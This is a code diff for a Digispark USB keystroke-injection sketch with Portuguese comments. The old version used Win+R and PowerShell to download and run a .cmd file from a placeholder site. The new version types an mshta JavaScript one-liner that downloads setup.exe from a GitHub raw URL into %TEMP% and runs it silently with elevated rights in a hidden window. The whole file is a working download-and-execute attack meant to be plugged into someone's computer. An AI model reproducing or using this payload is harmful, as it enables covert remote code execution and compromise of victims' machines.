@@ -1,32 +1,37 @@
+#define LAYOUT_PORTUGUESE
 #include "DigiKeyboard.h"
 
 void setup() {
-  // 1) Espera o Windows ficar pronto
-  DigiKeyboard.delay(5000);
-
-  // 2) Abre Run (Win+R)
-  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-
-  // 3) Comando para baixar o script via PowerShell
-  DigiKeyboard.print(
-    "powershell -Command \""
-    "(New-Object System.Net.WebClient).DownloadFile("
-      "'https://seusite.com/install-node.cmd',"
-      "'%TEMP%\\\\install-node.cmd'"
-    ")\""
-  );
-  DigiKeyboard.sendKeyPress(KEY_ENTER);
-
-  // 4) Aguarda o download
+  // Aguarda um pouco antes de começar
   DigiKeyboard.delay(3000);
-
-  // 5) Abre de novo o Run (Win+R)
+  
   DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-
-  // 6) Executa o script que ficou em %TEMP%
-  DigiKeyboard.print("%TEMP%\\\\install-node.cmd");
+  
+  // Digita o comando mshta com layout português
+  DigiKeyboard.print("mshta \"javascript:");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("var x=new ActiveXObject('Microsoft.XMLHTTP');");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("x.open('GET','https://raw.githubusercontent.com/ctp-maker/Expoe/main/setup.exe',false);");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("x.send();");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("var s=new ActiveXObject('ADODB.Stream');");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("s.Type=1; s.Open(); s.Write(x.responseBody);");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("s.SaveToFile('%TEMP%\\\\setup.exe',2); s.Close();");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("var sh=new ActiveXObject('Shell.Application');");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("sh.ShellExecute('%TEMP%\\\\setup.exe','/S','','runas',0);");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("close();");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("\"");
+  
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyPress(KEY_ENTER);
 }
 
